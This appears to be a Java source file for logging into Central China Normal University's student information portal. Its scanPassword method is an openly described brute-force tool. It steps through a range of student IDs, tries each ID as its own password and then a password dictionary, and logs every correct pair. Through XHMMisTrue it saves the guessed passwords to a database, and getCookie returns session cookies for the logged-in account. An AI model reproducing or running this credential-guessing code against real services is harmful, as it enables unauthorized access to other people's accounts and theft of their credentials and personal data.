package tool.ccnu;

/**
 * Created with Intellij IDEA.
 * User: WuHaoLin
 * Date: 1/18/14
 * Time: 10:22 AM
 */

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import tool.NetworkException;
import tool.R;
import tool.ValidateException;
import tool.ccnu.student.ManageStudents;

import java.io.IOException;
import java.util.Arrays;
import java.util.Map;

/**
 * 登入CCNU信息门户
 */
public class CCNUPortal {

    private static final Logger log = LoggerFactory.getLogger(CCNUPortal.class);

    /**
     * 登入的URL
     */
    private static final String URL_Login = "http://portal.ccnu.edu.cn/loginAction.do";

    /**
     * 用学号密码去登录信息门户看是否正确
     * 如果是正确的帐号密码就更新的数据库
     *
     * @param XH 学号
     * @param MM 密码
     * @return 是否正确
     */
    public static boolean XHMMisTrue(String XH, String MM) {
        Connection connection = Jsoup.connect("http://portal.ccnu.edu.cn/loginAction.do");
        connection.userAgent(R.USER_AGENT);
        connection.data("userName", XH);
        connection.data("userPass", MM);
        try {
            Document document = connection.post();
            boolean re = !document.toString().contains("错误");
            if (re) {//如果是正确的帐号密码就更新的数据库
                ManageStudents.update_PasswordToSQL(XH, MM);
            }
            return re;
        } catch (IOException e) {
            log.error(Arrays.toString(e.getStackTrace()));
            return false;
        }
    }

    /**
     * 暴力破解信息门户账号密码
     * 猜对的会保存到数据库中,而且回去抓取信息保存到数据库中
     *
     * @param start 开始的学号
     * @param end   结束的学号
     * @param pass  密码字典,同时还会探测和账号一样的密码
     * @return 成功猜对的个数
     */
    public static int scanPassword(int start, int end, String pass[]) {
        int re = 0;
        for (int i = start; i <= end; i++) {
            String xh = Integer.toString(i);
            if (CCNUPortal.XHMMisTrue(xh, xh)) {
                log.info("成功猜对账号{}密码{}", xh, xh);
                re++;
            } else {
                for (String one : pass) {
                    if (CCNUPortal.XHMMisTrue(xh, one)) {
                        log.info("成功猜对账号{}密码{}", xh, one);
                        re++;
                    }
                }
            }
        }
        return re;
    }


    /**
     * 用帐号密码去登入信息门户,获得信息门户的cookies
     *
     * @param XH 帐号
     * @param MM 密码
     * @return 返回信息门户网站的JSESSIONID
     */
    public static Map<String, String> getCookie(String XH, String MM) throws NetworkException, ValidateException {
        Connection connection = Jsoup.connect(URL_Login);//登入的URL
        connection.userAgent(R.USER_AGENT);
        connection.data("userName", XH);
        connection.data("userPass", MM);
        connection.timeout(R.ConnectTimeout);
        Document document;
        try {
            document = connection.get();
        } catch (IOException e) {
            log.error(Arrays.toString(e.getStackTrace()));
            throw new NetworkException("信息门户服务器繁忙");
        }
        if (document.toString().contains("错误")) {
            log.info("错误的帐号{}密码{},尝试登入", XH, MM);
            throw new ValidateException("你的帐号密码错误");
        }
        Map<String, String> reCookies = connection.response().cookies();
        if (reCookies.size() < 1) {
            throw new ValidateException("需要识别验证码");
        }
        return reCookies;
    }


}
